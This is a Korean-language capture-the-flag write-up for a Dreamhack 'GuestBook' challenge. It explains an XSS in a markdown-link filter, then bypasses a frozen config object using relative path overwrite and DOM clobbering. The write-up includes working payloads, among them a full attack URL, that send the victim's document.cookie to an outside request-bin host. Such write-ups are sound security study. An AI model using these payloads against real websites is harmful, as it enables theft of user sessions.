## GuestBook
---

```php
<?php
function addLink($content){
  $content = htmlentities($content);
  $content = preg_replace('/\[(.*?)\]\((.*?)\)/', "<a href='$2'>$1</a>", $content);
  PreventXSS($content);
  return $content;
}
?>
```

<br><br>

## Solution
---

문제를 풀다가 풀릴거 같은데 익스플로잇 코드를 못짜니까 너무 화가 났다.

결국에는 문뜩 생각이 나서 풀었는데, onfocus 이벤트와 autofocus 속성을 이용해서 해결할 수 있었다..

<br>

```[a](' autofocus onfocus='javascript:location.href=`http://xauitam.request.dreamhack.games?cookie=`%2bdocument.cookie)```

<br>

근데 풀이를 보면 Dom Clobbering으로도 풀 수가 있었다..

<br>

```javascript
// config.js

window.CONFIG = {
  version: "v0.1",
  main: "/",
  debug: false,
  debugMSG: ""
}

// prevent overwrite
Object.freeze(window.CONFIG);
```

<br>

```html
<!-- GuestBook.php 코드 일부분 -->

<script src="config.js"></script>
<script>
  if(window.CONFIG && window.CONFIG.debug){
    location.href = window.CONFIG.main;
  }
</script> 
```

<br>

DOM Clobbering으로 공격을 진행해보면 아래와 같다.

위의 코드를 보면 ```location.href```를 하려면 조건이 성립해야 하는데, ```window.CONFIG``` 값은 ```Object.freeze``` 메소드로 인해 변경할 수 가 없다.

하지만, 자세히 보면은 ```config.js```가 상대 경로로 불러오고 있음을 알 수 있다.

따라서 경로를 ```/GuestBook.php```가 아니라 ```/GuestBook.php/```로 설정해준다면 기존에 ```localhost/config.js```를 불러오던 것이 ```localhost/GuestBook.php/config.js```를 불러오게 되어서 우회해줄 수 있는 것이다..! **(RPO 취약점)**

<br>

RPO 취약점을 이용해서 방어 코드를 우회하고 DOM Clobbering을 해줄 수 있다.

DOM Clobbering 공격의 핵심은 HTMLCollection을 만들어주는 것이다.

CONFIG의 키에 main과 debug 값을 추가해줘야 한다.

따라서 공격코드는 아래와 같다.

<br>

```
[a](javascript:location.href=`http://bzbxhgx.request.dreamhack.games?cookie=`%2bdocument.cookie' id='CONFIG' name='main)
[a](javascript:location.href=`http://bzbxhgx.request.dreamhack.games?cookie=`%2bdocument.cookie' id='CONFIG' name='debug)
```

<br>

이렇게 id에 CONFIG, name에 각각 debug와 main을 넣어준다면 console 창에서 window.CONFIG를 했을 때, HTMLCollection이 나오면서 키 값으로 main과 debug가 있음을 알 수 있다.

위의 코드를 ```GuestBook.php/?content=```에서 넣어주면 코드가 실행이 된다!!!!

<br>

```
GuestBook.php/?content=[a](javascript:location.href=`http://bzbxhgx.request.dreamhack.games?cookie=`%2bdocument.cookie' id='CONFIG' name='main)%0d%0a[a](javascript:location.href=`http://xauitam.request.dreamhack.games?cookie=`%2bdocument.cookie' id='CONFIG' name='debug)
```
